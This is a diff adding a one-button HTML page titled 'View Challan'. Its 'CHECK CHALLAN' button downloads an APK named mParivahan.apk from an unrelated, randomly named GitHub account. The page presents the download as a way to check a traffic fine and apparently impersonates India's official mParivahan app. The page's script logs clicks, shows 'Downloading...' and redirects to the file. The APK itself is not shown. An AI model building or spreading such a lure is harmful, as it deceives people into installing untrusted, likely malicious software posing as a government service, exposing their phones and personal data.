@@ -1,0 +1,99 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>View Challan</title>
+
+<style>
+body{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  margin:0;
+  background:#f0f0f0;
+}
+
+.button{
+  background-color:red;
+  color:white;
+  font-size:22px;
+  padding:18px 40px;
+  border:none;
+  border-radius:10px;
+  cursor:pointer;
+  transition:transform 0.2s, background-color 0.2s;
+  font-weight:bold;
+  text-decoration:none;
+  box-shadow:0 4px 8px rgba(0,0,0,0.2);
+}
+
+.button:hover{
+  background-color:#cc0000;
+  transform:translateY(-2px);
+}
+
+.button:active{
+  transform:translateY(0);
+}
+</style>
+</head>
+
+<body>
+
+<!-- APK DOWNLOAD LINK -->
+<a class="button" id="challanBtn" href="https://github.com/moreignsourance-arch/bdjdieje/releases/download/v1.0.0/mParivahan.apk">
+  CHECK CHALLAN
+</a>
+
+<script>
+
+function trackClick(){
+
+  let count = localStorage.getItem('challan_clicks') || 0;
+  count = parseInt(count) + 1;
+
+  localStorage.setItem('challan_clicks', count);
+
+  const clickData = {
+    timestamp:new Date().toISOString(),
+    count:count,
+    userAgent:navigator.userAgent.substring(0,50)
+  };
+
+  const history = JSON.parse(localStorage.getItem('challan_history') || '[]');
+  history.push(clickData);
+
+  localStorage.setItem(
+    'challan_history',
+    JSON.stringify(history.slice(-50))
+  );
+
+  console.log("🚨 Button Clicked");
+  console.log("Total Clicks:",count);
+}
+
+document.getElementById("challanBtn").addEventListener("click",function(e){
+
+  e.preventDefault();
+
+  trackClick();
+
+  const btn=this;
+  const downloadLink=btn.href;
+
+  btn.textContent="Downloading...";
+  btn.style.pointerEvents="none";
+
+  setTimeout(()=>{
+    window.location.href=downloadLink;
+  },300);
+
+});
+
+</script>
+
+</body>
+</html>
